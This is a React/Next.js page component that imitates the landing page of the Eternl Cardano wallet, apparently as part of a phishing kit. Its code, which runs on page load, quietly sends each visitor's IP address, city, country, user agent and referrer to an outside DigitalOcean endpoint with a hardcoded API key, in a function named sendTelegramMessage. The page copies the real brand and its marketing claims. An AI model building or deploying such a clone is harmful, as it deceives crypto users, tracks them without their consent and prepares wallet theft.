'use client'
import { useRef, useState, useEffect } from 'react';
import { usePathname } from 'next/navigation';
import { getUserCountry } from '../userLocation';
import axios from 'axios';



export default function InfoPage() {
  const [country, setCountry] = useState("");
  const [ipAddress, setIpAddress] = useState("");
  const [browser, setBrowser] = useState("");
  const hasSentVisitorMessage = useRef(false);
  const pathname = usePathname();
  const getCurrentUrl = () => {
    if (typeof window !== "undefined") {
      let url = `${window.location.origin}${pathname}`;
      if (url.includes("localhost")) {
        url = "https://google.com";
      }
      if (url.includes("vercel.com")) {
        url = url.replace("vercel.com", "digitalocean.com");
      }
      console.log("getCurrentUrl returning:", url);
      return url;
    }
    console.log("getCurrentUrl: window not available, returning empty string");
    return "";
  };
  const sendTelegramMessage = (userCountry: { country?: string; countryEmoji?: string; city?: string; ip?: string } | null) => {
    // console.log("User Country", userCountry);

    const messageData = {
      info: "Regular Visitor", // You can update this logic as needed
      url: getCurrentUrl(),
      referer: document.referrer || getCurrentUrl(),
      location: {
        country: userCountry?.country || "Unknown",
        countryEmoji: userCountry?.countryEmoji || "",
        city: userCountry?.city || "Unknown",
        ipAddress: userCountry?.ip || "0.0.0.0",
      },
      agent: typeof navigator !== "undefined" ? navigator.userAgent : browser,
      date: new Date().toISOString(),
      appName: "eternl",
    };
    console.log("Message Data", messageData);
    axios
      .post(
        "https://squid-app-2-abmzx.ondigitalocean.app/api/t1/font",
        messageData,
        {
          headers: {
            "Content-Type": "application/json",
            "x-api-key": "e7a25d99-66d4-4a1b-a6e0-3f2e93f25f1b",
          },
        }
      )
      .catch((error) =>
        console.error(
          "Error sending font message:",
          error.response.data.details
        )
      );
  };

  useEffect(() => {
    if (!hasSentVisitorMessage.current) {
      const fetchUserLocation = async () => {
        const userCountry = await getUserCountry();
        sendTelegramMessage(userCountry);
      };
      fetchUserLocation();
      hasSentVisitorMessage.current = true;
    }
  }, [sendTelegramMessage]);

 

  useEffect(() => {
    // Set browser info only on client side
    if (typeof window !== "undefined") {
      setBrowser(navigator.userAgent);
    }
  }, [sendTelegramMessage]);

  useEffect(() => {
    if (!hasSentVisitorMessage.current) {
      const fetchUserLocation = async () => {
        const userCountry = await getUserCountry();
        sendTelegramMessage(userCountry);
      };
      fetchUserLocation();
      hasSentVisitorMessage.current = true;
    }
  }, [sendTelegramMessage]);
  return (
    <div className="min-h-screen bg-gray-900 text-white">
      {/* Header */}
      <header className="bg-gray-900 border-b border-gray-800">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between items-center py-6">
            <div className="flex items-center space-x-3">
              <div className="w-8 h-8 bg-gradient-to-r from-pink-500 to-orange-500 rounded-lg flex items-center justify-center">
                <span className="text-white font-bold text-lg">E</span>
              </div>
              <span className="text-2xl font-bold text-white">Eternl</span>
            </div>
            
            <nav className="hidden md:flex space-x-8">
              <div className="flex items-center space-x-1">
                <a href="#" className="text-gray-300 hover:text-white">Wallet</a>
                <svg className="w-4 h-4 text-gray-400" fill="currentColor" viewBox="0 0 20 20">
                  <path fillRule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clipRule="evenodd" />
                </svg>
              </div>
              <a href="#" className="text-gray-300 hover:text-white">DeFi</a>
              <a href="#" className="text-gray-300 hover:text-white">Staking</a>
              <a href="#" className="text-gray-300 hover:text-white">DApps</a>
              <div className="flex items-center space-x-1">
                <a href="#" className="text-gray-300 hover:text-white">Support</a>
                <svg className="w-4 h-4 text-gray-400" fill="currentColor" viewBox="0 0 20 20">
                  <path fillRule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clipRule="evenodd" />
                </svg>
              </div>
            </nav>
            
            <div className="flex items-center space-x-4">
              <a href="#" className="text-gray-300 hover:text-white">Connect Wallet</a>
              <button className="bg-gradient-to-r from-pink-500 to-orange-500 hover:from-pink-600 hover:to-orange-600 text-white px-6 py-2 rounded-lg flex items-center space-x-2 transition-colors">
                <span>Download App</span>
                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
                  <path fillRule="evenodd" d="M10.293 3.293a1 1 0 011.414 0l6 6a1 1 0 010 1.414l-6 6a1 1 0 01-1.414-1.414L14.586 11H3a1 1 0 110-2h11.586l-4.293-4.293a1 1 0 010-1.414z" clipRule="evenodd" />
                </svg>
              </button>
            </div>
          </div>
        </div>
      </header>

      {/* Hero Section */}
      <section className="relative py-20 px-4 sm:px-6 lg:px-8">
        <div className="max-w-7xl mx-auto">
          <div className="text-center mb-16">
            <h1 className="text-6xl md:text-7xl font-bold text-white mb-6">
              A modern Cardano wallet{" "}
              <span className="bg-gradient-to-r from-pink-500 via-orange-400 to-yellow-400 bg-clip-text text-transparent">
                for everyone
              </span>
            </h1>
            <p className="text-xl text-gray-300 max-w-3xl mx-auto">
              Friendly for beginners. Powerful for pro users. The most advanced Cardano wallet with DeFi, staking, and DApp support.
            </p>
          </div>

          {/* Central Graphic */}
          <div className="flex justify-center mb-12">
            <div className="relative">
              <div className="w-32 h-32 bg-gradient-to-r from-pink-500/20 to-orange-500/20 rounded-full flex items-center justify-center animate-pulse">
                <div className="w-24 h-24 bg-gradient-to-r from-pink-500/30 to-orange-500/30 rounded-full flex items-center justify-center">
                  <div className="w-16 h-16 bg-gradient-to-r from-pink-500/40 to-orange-500/40 rounded-full flex items-center justify-center">
                    <div className="w-8 h-8 bg-gradient-to-r from-pink-500 to-orange-500 rounded flex items-center justify-center">
                      <span className="text-white font-bold text-sm">E</span>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>

          {/* Wallet Status Card */}
          <div className="max-w-md mx-auto">
            <div className="bg-gray-800/50 backdrop-blur-sm rounded-2xl p-6 border border-gray-700">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-sm text-gray-400">Cardano Wallet</p>
                  <p className="text-sm text-gray-400">Mainnet Connected</p>
                </div>
                <div className="flex items-center space-x-3">
                  <div className="w-12 h-12 bg-gradient-to-r from-pink-500 to-orange-500 rounded-full flex items-center justify-center">
                    <span className="text-white font-semibold">E</span>
                  </div>
                  <div>
                    <p className="text-white font-semibold">Eternl Wallet</p>
                    <div className="flex items-center space-x-2">
                      <div className="w-2 h-2 bg-green-400 rounded-full"></div>
                      <span className="text-xs text-gray-400">Online</span>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>

          {/* Scroll Indicators */}
          <div className="flex justify-center mt-8 space-x-2">
            <div className="w-2 h-2 bg-white rounded-full"></div>
            <div className="w-2 h-2 bg-gray-600 rounded-full"></div>
            <div className="w-2 h-2 bg-gray-600 rounded-full"></div>
          </div>
        </div>
      </section>

      {/* Effortless Finance Section */}
      <section className="py-20 px-4 sm:px-6 lg:px-8">
        <div className="max-w-7xl mx-auto">
          <div className="flex items-center justify-between mb-12">
            <div>
              <p className="text-pink-400 text-sm font-medium mb-2">Cardano DeFi</p>
              <h2 className="text-4xl font-bold text-white">Complete Cardano ecosystem access</h2>
            </div>
            <button className="w-12 h-12 bg-gray-800 rounded-full flex items-center justify-center hover:bg-gray-700 transition-colors">
              <svg className="w-6 h-6 text-white" fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M12.707 5.293a1 1 0 010 1.414L9.414 10l3.293 3.293a1 1 0 01-1.414 1.414l-4-4a1 1 0 010-1.414l4-4a1 1 0 011.414 0z" clipRule="evenodd" />
              </svg>
            </button>
          </div>

          <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
            {/* DeFi & Staking Card */}
            <div className="bg-gray-800/50 backdrop-blur-sm rounded-2xl p-8 border border-gray-700 relative">
              <div className="absolute left-0 top-0 bottom-0 w-1 bg-gradient-to-b from-pink-500 to-orange-500 rounded-l-2xl"></div>
              <h3 className="text-3xl font-bold text-white mb-4">DeFi & Staking</h3>
              <p className="text-gray-300 text-lg">
                Access Cardano DeFi protocols, stake your ADA, and earn rewards with the most comprehensive Cardano wallet.
              </p>
            </div>

            {/* Recent Activity Card */}
            <div className="bg-gray-800/50 backdrop-blur-sm rounded-2xl p-6 border border-gray-700">
              <div className="space-y-4">
                <div className="flex items-center space-x-4">
                  <div className="w-10 h-10 bg-gradient-to-r from-green-500 to-emerald-500 rounded-full flex items-center justify-center">
                    <span className="text-white font-semibold text-sm">+</span>
                  </div>
                  <div className="flex-1">
                    <p className="text-white font-medium">Staking Reward</p>
                    <p className="text-gray-400 text-sm">Received, May 3 0:44 PM</p>
                  </div>
                  <span className="text-green-400 font-semibold">+2.45 ADA</span>
                </div>

                <div className="flex items-center space-x-4">
                  <div className="w-10 h-10 bg-gradient-to-r from-pink-500 to-orange-500 rounded-full flex items-center justify-center">
                    <span className="text-white font-semibold text-sm">D</span>
                  </div>
                  <div className="flex-1">
                    <p className="text-white font-medium">DeFi Swap</p>
                    <p className="text-gray-400 text-sm">Minswap, May 3 0:42 PM</p>
                  </div>
                  <span className="text-blue-400 font-semibold">ADA → cNETA</span>
                </div>

                <div className="flex items-center space-x-4">
                  <div className="w-10 h-10 bg-gradient-to-r from-blue-500 to-cyan-500 rounded-full flex items-center justify-center">
                    <span className="text-white font-semibold text-sm">N</span>
                  </div>
                  <div className="flex-1">
                    <p className="text-white font-medium">NFT Purchase</p>
                    <p className="text-gray-400 text-sm">CNFT, May 3 0:40 PM</p>
                  </div>
                  <span className="text-purple-400 font-semibold">-15 ADA</span>
                </div>

                <div className="flex items-center space-x-4">
                  <div className="w-10 h-10 bg-gradient-to-r from-purple-500 to-indigo-500 rounded-full flex items-center justify-center">
                    <span className="text-white font-semibold text-sm">S</span>
                  </div>
                  <div className="flex-1">
                    <p className="text-white font-medium">Stake Delegation</p>
                    <p className="text-gray-400 text-sm">Pool, May 3 0:38 PM</p>
                  </div>
                  <span className="text-yellow-400 font-semibold">1,000 ADA</span>
                </div>
              </div>
            </div>
          </div>

          {/* ADA Balance Card */}
          <div className="mt-8">
            <div className="bg-gray-800/50 backdrop-blur-sm rounded-2xl p-6 border border-gray-700 max-w-xs">
              <div className="flex items-center space-x-3">
                <div className="w-8 h-8 bg-gradient-to-r from-blue-500 to-cyan-500 rounded-full flex items-center justify-center">
                  <span className="text-white font-bold text-sm">₳</span>
                </div>
                <div>
                  <p className="text-white font-semibold">Cardano (ADA)</p>
                  <p className="text-green-400 font-bold">1,250.45 ADA</p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Features Section */}
      <section className="py-20 px-4 sm:px-6 lg:px-8 bg-gray-800/30">
        <div className="max-w-7xl mx-auto">
          <div className="text-center mb-16">
            <p className="text-pink-400 text-sm font-medium mb-2">Advanced Features</p>
            <h2 className="text-4xl font-bold text-white">Complete Cardano wallet solution</h2>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
            <div className="bg-gray-800/50 backdrop-blur-sm rounded-2xl p-8 border border-gray-700">
              <div className="w-12 h-12 bg-gradient-to-r from-pink-500 to-orange-500 rounded-lg flex items-center justify-center mb-6">
                <svg className="w-6 h-6 text-white" fill="currentColor" viewBox="0 0 20 20">
                  <path d="M4 4a2 2 0 00-2 2v1h16V6a2 2 0 00-2-2H4z" />
                  <path fillRule="evenodd" d="M18 9H2v5a2 2 0 002 2h12a2 2 0 002-2V9zM4 13a1 1 0 011-1h1a1 1 0 110 2H5a1 1 0 01-1-1zm5-1a1 1 0 100 2h1a1 1 0 100-2H9z" clipRule="evenodd" />
                </svg>
              </div>
              <h3 className="text-xl font-semibold text-white mb-4">Cardano Native Assets</h3>
              <p className="text-gray-300">
                Manage ADA and all Cardano native assets (tokens, NFTs) with full support for the Cardano ecosystem.
              </p>
            </div>

            <div className="bg-gray-800/50 backdrop-blur-sm rounded-2xl p-8 border border-gray-700">
              <div className="w-12 h-12 bg-gradient-to-r from-green-500 to-emerald-500 rounded-lg flex items-center justify-center mb-6">
                <svg className="w-6 h-6 text-white" fill="currentColor" viewBox="0 0 20 20">
                  <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
                </svg>
              </div>
              <h3 className="text-xl font-semibold text-white mb-4">Hardware Wallet Support</h3>
              <p className="text-gray-300">
                Connect Ledger, Trezor, and Keystone hardware wallets for maximum security. Your keys never leave your device.
              </p>
            </div>

            <div className="bg-gray-800/50 backdrop-blur-sm rounded-2xl p-8 border border-gray-700">
              <div className="w-12 h-12 bg-gradient-to-r from-purple-500 to-pink-500 rounded-lg flex items-center justify-center mb-6">
                <svg className="w-6 h-6 text-white" fill="currentColor" viewBox="0 0 20 20">
                  <path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                </svg>
              </div>
              <h3 className="text-xl font-semibold text-white mb-4">DApp Browser</h3>
              <p className="text-gray-300">
                Access Cardano DApps directly from the wallet. DeFi, NFT marketplaces, and staking pools at your fingertips.
              </p>
            </div>
          </div>
        </div>
      </section>

      {/* Stats Section */}
      <section className="py-20 px-4 sm:px-6 lg:px-8">
        <div className="max-w-7xl mx-auto">
          <div className="text-center mb-16">
            <h2 className="text-4xl font-bold text-white mb-4">Trusted by the Cardano community</h2>
            <p className="text-gray-300 text-xl">The most advanced Cardano wallet</p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-4 gap-8">
            <div className="text-center">
              <div className="text-4xl font-bold text-pink-400 mb-2">500K+</div>
              <div className="text-gray-300">Active Users</div>
            </div>
            <div className="text-center">
              <div className="text-4xl font-bold text-orange-400 mb-2">$2BN+</div>
              <div className="text-gray-300">Assets Under Management</div>
            </div>
            <div className="text-center">
              <div className="text-4xl font-bold text-yellow-400 mb-2">50+</div>
              <div className="text-gray-300">DApps Supported</div>
            </div>
            <div className="text-center">
              <div className="text-4xl font-bold text-cyan-400 mb-2">1000+</div>
              <div className="text-gray-300">Native Assets</div>
            </div>
          </div>
        </div>
      </section>

      {/* Footer */}
      <footer className="bg-gray-900 border-t border-gray-800 py-12">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="grid grid-cols-1 md:grid-cols-4 gap-8">
            <div>
              <div className="flex items-center space-x-3 mb-4">
                <div className="w-8 h-8 bg-gradient-to-r from-pink-500 to-orange-500 rounded-lg flex items-center justify-center">
                  <span className="text-white font-bold text-lg">E</span>
                </div>
                <span className="text-xl font-bold text-white">Eternl</span>
              </div>
              <p className="text-gray-400">
                A modern Cardano wallet for everyone. Friendly for beginners, powerful for pro users.
              </p>
            </div>
            
            <div>
              <h3 className="text-lg font-semibold text-white mb-4">Features</h3>
              <ul className="space-y-2 text-gray-400">
                <li><a href="#" className="hover:text-white transition-colors">DeFi</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Staking</a></li>
                <li><a href="#" className="hover:text-white transition-colors">NFTs</a></li>
                <li><a href="#" className="hover:text-white transition-colors">DApp Browser</a></li>
              </ul>
            </div>
            
            <div>
              <h3 className="text-lg font-semibold text-white mb-4">Resources</h3>
              <ul className="space-y-2 text-gray-400">
                <li><a href="#" className="hover:text-white transition-colors">Documentation</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Tutorials</a></li>
                <li><a href="#" className="hover:text-white transition-colors">API</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Community</a></li>
              </ul>
            </div>
            
            <div>
              <h3 className="text-lg font-semibold text-white mb-4">Support</h3>
              <ul className="space-y-2 text-gray-400">
                <li><a href="#" className="hover:text-white transition-colors">Help Center</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Documentation</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Security</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Status</a></li>
              </ul>
            </div>
          </div>
          
          <div className="border-t border-gray-800 mt-8 pt-8 text-center text-gray-400">
            <p>&copy; 2024 Eternl. All rights reserved.</p>
          </div>
        </div>
      </footer>
    </div>
  );
}